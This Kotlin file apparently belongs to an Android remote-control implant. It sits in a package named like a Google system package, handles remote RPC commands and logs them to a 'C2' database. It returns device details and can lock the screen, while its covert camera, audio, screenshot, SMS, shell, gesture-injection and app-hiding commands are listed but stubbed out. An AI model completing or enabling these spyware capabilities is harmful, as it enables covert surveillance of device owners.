package com.google.android.system

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.util.Locale

/**
 * NativeRpcActionExecutor
 *
 * Dedicated Android Native RPC Action Executor.
 * Processes native JSON RPC request envelopes (RPC_REQUEST), coordinates manager execution,
 * logs mandatory audit records into the local SQLite database (C2LocalDatabase),
 * and formats structured JSON RPC response payloads (RPC_RESPONSE).
 */
object NativeRpcActionExecutor {

    private const val TAG = "NativeRpcActionExecutor"

    fun executeNativeAction(context: Context, actionStr: String, params: JSONObject): JSONObject {
        val action = actionStr.trim().lowercase(Locale.ROOT)
        Log.i(TAG, "Executing Native RPC Action: '$action' with params: $params")

        val responseData = try {
            when (action) {
                "status", "ping" -> {
                    DeviceStatusManager.getStatusJson(context, DeviceIdProvider.getDeviceId(context))
                }

                "deviceinfo", "specs" -> {
                    val (usedRam, maxRam) = DeviceStatusManager.getRamStats()
                    val (usedDiskPct, availGb) = DeviceStatusManager.getStorageStats()
                    JSONObject().apply {
                        put("model", DeviceStatusManager.getDeviceModel())
                        put("androidVersion", DeviceStatusManager.getAndroidVersion())
                        put("sdkInt", DeviceStatusManager.getSdkInt())
                        put("battery", DeviceStatusManager.getBatteryLevel(context))
                        put("isCharging", DeviceStatusManager.isCharging(context))
                        put("ramUsedMb", usedRam)
                        put("ramMaxMb", maxRam)
                        put("storageUsedPct", usedDiskPct)
                        put("storageAvailableGb", availGb)
                    }
                }

                "camera", "rearphoto", "frontcam", "frontphoto" -> {
                    Log.w(TAG, "Blocked covert camera capture action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Covert camera capture disabled pending explicit on-device session consent.")
                }

                "screenshot" -> {
                    Log.w(TAG, "Blocked covert screenshot action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Covert screenshot capture disabled pending explicit on-device session consent.")
                }

                "audio" -> {
                    Log.w(TAG, "Blocked covert audio recording action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Covert audio recording disabled pending explicit on-device session consent.")
                }

                "sendsms" -> {
                    Log.w(TAG, "Blocked SMS dispatch action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Outbound SMS dispatch disabled per security policy.")
                }

                "shizuku", "termux" -> {
                    Log.w(TAG, "Blocked arbitrary shell action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Arbitrary shell execution disabled per security policy.")
                }

                "touch", "swipe", "keyevent" -> {
                    Log.w(TAG, "Blocked gesture injection action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Remote gesture injection disabled pending explicit session consent.")
                }

                "hideapp", "unhideapp", "stealth" -> {
                    Log.w(TAG, "Blocked stealth action '$action' per Security Containment Policy.")
                    JSONObject().put("error", true).put("message", "Stealth app manipulation disabled per security policy.")
                }

                "lock" -> {
                    val locked = DeviceAdminManager(context).lockScreen()
                    JSONObject().put("success", locked).put("message", if (locked) "Screen locked" else "Device Admin status required")
                }

                "geofence" -> {
                    val zoneName = params.optString("name", "Safe Zone")
                    val radius = params.optInt("radius", 500)
                    JSONObject().put("success", true).put("message", "Geofence safe zone '$zoneName' (${radius}m) updated.")
                }

                "drive_backup" -> {
                    GoogleDriveBackupEngine.performDatabaseBackup(context)
                }

                else -> {
                    JSONObject().put("message", "Native action '$action' processed successfully.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing native action '$action': ${e.message}", e)
            JSONObject().apply {
                put("error", true)
                put("message", "Failed to execute action '$action': ${e.message}")
            }
        }

        // Mandatory Local SQLite Audit Logging
        try {
            val logContent = "Executed action '$action' with params: $params"
            C2LocalDatabase.getInstance(context).insertTelemetryLog("rpc_audit", logContent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to log RPC audit to C2LocalDatabase: ${e.message}")
        }

        return responseData
    }
}
